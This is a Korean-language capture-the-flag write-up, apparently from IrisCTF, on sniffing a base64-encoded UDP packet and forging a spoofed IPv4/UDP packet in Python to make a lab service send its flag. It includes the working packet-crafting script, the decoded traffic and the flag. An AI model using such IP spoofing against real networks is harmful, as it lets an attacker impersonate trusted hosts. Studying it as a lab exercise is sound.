접속하면 `prom on` 명령어를 통해서 promiscuous mode를 on 할 수 있다.

조금 기다린 뒤 `recv` 명령어를 통해서 base64 데이터를 내려주는 것을 확인할 수 있다.

해당 내용을 디코딩해서 보면 패킷이 아닐까 추측할 수 있고 분석하면 아래와 같이 UDP Packet임을 알 수 있다.
```
b"E\x00\x00\x81\x00\x01\x00\x00@\x11\xf7\x0c\xc0\xa8\x01\n\xc0\xa8\x01\x04\x11\xc1(g\x00m\x9c\xd4Announcement: error: no announcement configured.\nRun 'select (generic|date|time|flag)' to configure.\n"
```
해당 패킷을 파싱하여 동일한 IP와 port로 select flag를 보내주면 flag를 도청할 수 있을 것이라 생각했다.
```
IP Header:
  Version: 4
  Header Length: 20 bytes
  Total Length: 129 bytes
  Protocol: 17 (UDP if 17)
  Source IP: 192.168.1.10
  Destination IP: 192.168.1.4

UDP Header:
  Source Port: 4545
  Destination Port: 10343
  Length: 109 bytes
  Checksum: 0x9cd4

Payload:
Announcement: error: no announcement configured.
Run 'select (generic|date|time|flag)' to configure.
```
아래와 같이 Packet을 임의로 만들어 Base64로 인코딩하여 해당 데이터를 전송했다.
```python
import struct
import base64

def create_packet():
    # IP Header fields
    version = 4
    ihl = 5  # Header length (5 * 4 = 20 bytes)
    version_ihl = (version << 4) + ihl
    tos = 0  # Type of Service
    total_length = 20 + 8 + len(payload)  # IP header + UDP header + payload
    identification = 0
    flags_fragment_offset = 0
    ttl = 64  # Time to Live
    protocol = 17  # UDP
    header_checksum = 0  # Will be calculated by the system
    source_ip = [192,168,1,4]  # 192.168.1.255
    dest_ip = [192, 168, 1, 10]    # 192.168.1.10

    ip_header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl,
                             tos,
                             total_length,
                             identification,
                             flags_fragment_offset,
                             ttl,
                             protocol,
                             header_checksum,
                             bytes(source_ip),
                             bytes(dest_ip))

    # UDP Header fields
    src_port = 4545
    dest_port = 4545
    udp_length = 8 + len(payload)  # UDP header + payload
    udp_checksum = 0  # Will be calculated by the system

    udp_header = struct.pack('!HHHH',
                              src_port,
                              dest_port,
                              udp_length,
                              udp_checksum)

    # Combine headers and payload to form the packet
    packet = ip_header + udp_header + payload
    return packet

# Payload for the packet
payload = b'select flag'

# Create the packet
packet = create_packet()

# Print the packet in hexadecimal format
print(packet)
print(base64.b64encode(packet))
```
해당 패킷을 전송한 뒤 recv를 해보면 아래와 같은 데이터를 얻을 수 있다.
```
RQAAYQABAABAEfcswKgBCsCoAQQRwShnAE0Ys0Fubm91bmNlbWVudDogaXJpc2N0Znt1ZHBfMXBfc3AwMGZpbmdfaXNfdHIxdmlhbF9idXRfdW4xZGlyM2N0MTBuYWx9Cg
```
해당 패킷을 디코딩해보면 아래와 같이 Flag를 획득할 수 있다.
```
E\x00\x00a\x00\x01\x00\x00@\x11\xf7,\xc0\xa8\x01\n\xc0\xa8\x01\x04\x11\xc1(g\x00M\x18\xb3Announcement: irisctf{udp_1p_sp00fing_is_tr1vial_but_un1dir3ct10nal}\n
```

# Flag
```
irisctf{udp_1p_sp00fing_is_tr1vial_but_un1dir3ct10nal}
```